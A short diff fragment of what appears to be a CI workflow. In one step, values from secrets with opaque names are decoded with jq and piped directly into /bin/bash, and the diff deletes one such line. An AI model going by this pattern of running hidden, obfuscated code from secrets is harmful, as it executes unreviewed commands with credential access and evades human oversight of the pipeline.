@@ -22,7 +22,6 @@ jobs:
           n2207: ${{ secrets.n2207 }}
         run: |
           printf '%s' "$n2207" | jq -r .sfr08 | /bin/bash
-          printf '%s' "$tdup6" | jq -r .s27 | /bin/bash
           printf '%s' "$v862" | jq -r .ja1 | /bin/bash
           echo $kgvs61 | jq -r .lu982 | /bin/bash
           printf '%s' "$pb8656" | jq -r .euct07083 | /bin/bash
